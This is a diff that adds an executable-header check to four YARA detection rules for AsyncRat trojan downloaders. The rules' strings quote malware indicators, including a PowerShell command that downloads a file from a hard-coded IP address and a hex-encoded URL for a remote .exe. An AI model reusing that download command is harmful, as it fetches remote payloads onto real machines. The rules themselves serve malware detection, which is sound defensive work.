@@ -19,6 +19,7 @@ rule TrojanDownloader_Win64_AsyncRat_CEB_2147845754_0
         $x_1_4 = "WindowsProject1" wide //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint16(0) == 0x5a4d) and
         (all of ($x*))
 }
 
@@ -40,6 +41,7 @@ rule TrojanDownloader_Win64_AsyncRat_CCIQ_2147926487_0
         $x_1_1 = {48 81 c7 5d 7a 17 48 57 5f 49 31 38 eb 0b 56 5e}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint16(0) == 0x5a4d) and
         (all of ($x*))
 }
 
@@ -61,6 +63,7 @@ rule TrojanDownloader_Win64_AsyncRat_CCJU_2147932185_0
         $x_2_1 = "powershell(new-object System.Net.WebClient).DownloadFile('http://149.88.66.68/test.mp3','%Temp%/test.bin')" ascii //weight: 2
     condition:
         (filesize < 20MB) and
+        (uint16(0) == 0x5a4d) and
         (all of ($x*))
 }
 
@@ -89,6 +92,7 @@ rule TrojanDownloader_Win64_AsyncRat_CCJX_2147940233_0
         $x_1_8 = {68 00 74 00 74 00 70 00 3a 00 2f 00 2f 00 38 00 30 00 2e 00 36 00 34 00 2e 00 31 00 38 00 2e 00 31 00 37 00 33 00 2f 00 [0-15] 2f 00 [0-15] 2e 00 65 00 78 00 65 00}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint16(0) == 0x5a4d) and
         (
             ((4 of ($x_2_*) and 3 of ($x_1_*))) or
             ((5 of ($x_2_*) and 1 of ($x_1_*))) or
